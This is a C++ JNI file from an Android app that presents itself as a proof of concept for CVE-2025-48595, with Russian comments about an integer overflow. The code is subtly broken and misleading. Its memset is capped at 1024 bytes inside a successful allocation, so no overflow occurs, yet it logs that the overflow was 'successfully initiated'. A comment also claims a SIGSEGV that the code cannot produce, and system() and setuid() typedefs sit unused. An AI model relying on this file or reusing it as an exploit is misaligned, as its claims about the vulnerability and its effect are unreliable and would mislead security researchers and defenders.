#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>

#define TARGET_SIZE 1024
#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);
typedef int (*setuid_func_t)(int);

extern "C"
JNIEXPORT void JNICALL
Java_com_example_android_1poc_MainActivity_triggerIntegerOverflowNative(JNIEnv *env, jobject thiz) {
    LOGI("[*] CVE-2025-48595 - Native Trigger Activated");

    // Имитация оверфлоу: передаем значение, которое в 32-bit int выглядит как маленькое,
    // но в 64-bit контексте или при арифметике ведет себя агрессивно.
    // В данном случае мы эмулируем ситуацию, где размер буфера вычисляется неверно.

    // Сценарий: malicious_size = SIZE_MAX (0xFFFFFFFFFFFFFFFF)
    size_t malicious_size = (size_t)-1;

    // Попытка выделения памяти под "гигантский" размер.
    // В реальном фреймворке здесь может происходить оверфлоу при умножении перед malloc.
    char *buffer = (char *)malloc(malicious_size);

    if (buffer == NULL) {
        LOGI("[!] Мемо-истощение или оверфлоу размера в malloc()");

        // Альтернативный вектор: если malloc вернул NULL, мы используем фиктивный размер
        // который на самом деле меньше, но логика программы считает его большим.
        size_t fake_size = 0xFFFFFFFF;
        buffer = (char *)malloc(fake_size);

        if (buffer == NULL) {
            LOGE("[!] Не удалось выделить память: OOM Killed");
            return; // App будет убит системой Android
        }
    }

    // ЗАПИСЬ ДАННЫХ ВНЕ ПРЕДЕЛОВ
    // Если размер вычислен неверно из-за integer overflow, memset запишет данные за пределы реального буфера.
    LOGI("[*] Запись 0x41 в буфер размером: %zu", malicious_size);

    // Для демонстрации уязвимости (в реальном CVE это происходит внутри системной библиотеки)
    // Здесь мы симулируем краш, записывая далеко за пределы выделенного.
    memset(buffer, 0x41, malicious_size > TARGET_SIZE ? TARGET_SIZE : malicious_size);

    LOGI("[+] POC исполнен: Переполнение памяти успешно инициировано");

    // Если malloc вернул указатель на область размером ~1KB (из-за оверфлоу в расчете),
    // но memset пытается записать SIZE_MAX байт -> SIGSEGV
    free(buffer);
}